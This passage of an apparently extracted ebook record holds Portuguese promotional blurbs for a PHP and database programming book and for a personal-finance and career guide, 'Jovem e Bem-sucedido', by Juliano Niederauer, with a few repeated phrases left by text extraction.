s\tno\tmundo\tinteiro.\tO\tlivro\tabrange\tdesde\nnoções\tbásicas\tde\tprogramação\taté\ta\tcriação\te\tmanutenção\tde\tbancos\nde\tdados,\tmostrando\tcomo\tsão\tfeitas\tinclusões,\texclusões,\talterações\te\nconsultas\ta\ttabelas\tde\tuma\tbase\tde\tdados.\tO\tautor\tapresenta\tdiversos\nexemplos\tde\tprogramas\tpara\tfacilitar\ta\tcompreensão\tda\tlinguagem.\nNesta\tobra,\tvocê\tirá\tencontrar\tos\tseguintes\ttópicos:\tO\tque\té\tPHP\te\nquais\tsão\tsuas\tcaracterísticas;\tConceitos\tbásicos\te\tavançados\tde\nprogramação\tem\tPHP;\tComo\tmanipular\tdiversos\ttipos\tde\tdados\tcom\no\tPHP;\tCriação\tde\tprogramas\torientados\ta\tobjetos\t(OOP);\tComandos\nPHP\tem\tconjunto\tcom\ttags\tHTML;\tUtilização\tde\tincludes\tpara\naumentar\to\tdinamismo\tde\tseu\tsite;\tComo\ttratar\tos\tdados\tenviados\tpor\num\tformulário\tHTML;\tUtilidade\tdas\tvariáveis\tde\tambiente\tno\tPHP;\nCriação\tde\tbanco\tde\tdados\tem\tMySQL,\tPostgreSQL\tou\tSQLite;\nComandos\tSQL\tpara\tacessar\to\tbanco\tde\tdados\tvia\tPHP;\tComo\tcriar\num\tsistema\tde\tusername/password\tpara\tseu\tsite;\tUtilização\tde\tcookies\ne\tsessões;\tLeitura\te\tgravação\tde\tdados\tem\tarquivos-texto;\tComoe\tsessões;\tLeitura\te\tgravação\tde\tdados\tem\tarquivos-texto;\tComo\nenviar\te-mails\tpelo\tPHP.\nCompre\tagora\te\tleiaJovem\te\tBem-sucedido\nNiederauer,\tJuliano\n9788575225325\n192\tpáginas\nCompre\tagora\te\tleia\nJovem\te\tBem-sucedido\té\tum\tverdadeiro\tguia\tpara\tquem\tdeseja\nalcançar\ta\trealização\tprofissional\te\ta\tfinanceira\to\tmais\trápido\npossível.\tRepleto\tde\tdicas\te\thistórias\tinteressantes\tvivenciadas\tpelo\nautor,\to\tlivro\tdesmistifica\tuma\tsérie\tde\tcrenças\trelativas\taos\testudos,\nao\ttrabalho\te\tao\tdinheiro.\tTem\tcomo\tobjetivo\torientar\to\tleitor\ta\nplanejar\tsua\tvida\tdesde\tcedo,\tpossibilitando\tque\tse\ttorne\tbem-\nsucedido\tem\tpouco\ttempo\te\tconsiga\tmanter\tessa\trealização\tno\ndecorrer\tdos\tanos.\tAs\ttrês\tperspectivas\tabordadas\tsão:\tESTUDOS:\nmostra\tque\tos\testudos\tvão\tmuito\talém\tda\tescola\tou\tfaculdade.\tAborda\nas\tmelhores\tpráticas\tde\testudo\te\ta\taquisição\tdos\tconhecimentos\tideais\ne\tnos\tmomentos\tcertos.\tTRABALHO:\texplica\tcomo\tvocê\tpode\tse\ntornar\tum\tprofissional\tmoderno,\tidentificando\toportunidades\te\naumentando\tcada\tvez\tmais\tsuas\tfontes\tde\trenda.\tFornece\tainda\tdicas\nvaliosas\tpara\tdesenvolver\tas\thabilidades\tmais\tvalorizadas\tno\tmercado\nde\ttrabalho.\tDINHEIRO:\texplica\tcomo\tassumir\to\tcontrole\tde\tsuas\nfinanças,\tpara,\tentão,\tcomeçar\ta\tinvestir\te\tmultiplicar\tseu\tpatrimônio.\nApresenta\testratégias\tde\tinvestimentos\tde\tacordo\tcom\to\tmomento\tde\nvida\tde\tcada\tum,\tabordando\tas\tvantagens\te\tdesvantagens\tde\tcada\ttipo\nde\tinvestimento.\tJovem\te\tBem-sucedido\tapresenta\tideias\tque\tode\tinvestimento.\tJovem\te\tBem-sucedido\tapresenta\tideias\tque\to\nacompanharão\ta\tvida\ttoda,\trealizando\timportantes\tmudanças\tno\tmodo\ncomo\tvocê\tplaneja\testudar,\ttrabalhar\te\tlidar\tcom\to\tdinheiro.\nCompre\tagora\te\tleia",
  "version": "2.16.105",
  "_id": "6820cf5707c8dc7cbd9b822f"
}